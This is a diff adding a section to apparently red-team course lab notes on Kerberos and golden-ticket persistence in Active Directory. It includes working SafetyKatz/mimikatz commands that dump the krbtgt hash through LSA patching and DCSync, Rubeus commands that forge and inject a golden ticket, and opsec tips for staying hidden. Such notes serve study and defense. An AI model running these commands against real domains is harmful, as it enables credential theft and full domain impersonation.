@@ -317,3 +317,48 @@ SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
 ```
 > [!IMPORTANT]
 > By default, Domain Admins, Enterprise Admins or Domain Controller privileges are required to run DCSync
+
+### About Kerberos
+* Kerberos is the basis of authentication in a Windows Active Directory environment. 
+* Clients (programs on behalf of a user) need to obtain tickets from Key Distribution Center (KDC) which is a service running on the domain 
+controller. These tickets represent the client's credentials.! Therefore, Kerberos is understandably a very interesting target of abuse!
+
+<img width="1133" height="632" alt="image" src="https://github.com/user-attachments/assets/3119572b-dc44-467f-9608-d9170883f1d4" />
+
+### Persistence - Golden Ticket
+
+A golden ticket is signed and encrypted by the hash of krbtgt account which makes it a valid TGT ticket.
+* The krbtgt user hash could be used to impersonate any user with any privileges from even a non-domain machine.
+* As a good practice, it is recommended to change the password of the krbtgt account twice as password history is maintained for the account.
+
+<img width="1312" height="679" alt="image" src="https://github.com/user-attachments/assets/860fbdda-68ac-4f64-8bd3-00005d468c0b" />
+
+Execute mimikatz (or a variant) on DC as DA to get krbtgt hash
+```
+C:\AD\Tools\SafetyKatz.exe '"lsadump::lsa /patch"'
+```
+To use the DCSync feature for getting AES keys for krbtgt account. Use the below command with DA privileges (or a user that has replication rights on the domain object):
+```
+C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
+```
+
+Using the DCSync option needs no code execution on the target DC.
+
+Use Rubeus to forge a Golden ticket with attributes similar to a normal TGT:
+```
+C:\AD\Tools\Rubeus.exe golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
+```
+
+Above command generates the ticket forging command. Note that 3 LDAP queries are sent to the DC to retrieve the values
+1. To retrieve flags for user specified in /user. 
+2. To retrieve /groups, /pgid, /minpassage and /maxpassage
+3. To retrieve /netbios of the current domain
+If you have already enumerated the above values, manually specify as many you can in the forging command (a bit more opsec friendly)
+
+The Golden ticket forging command looks like this:
+```
+C:\AD\Tools\Rubeus.exe golden 
+/aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 
+/domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:33:55 AM" /minpassage:1 
+/logoncount:2453 /netbios:dcorp /groups:544,512,520,513 /dc:DCORPDC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
+```
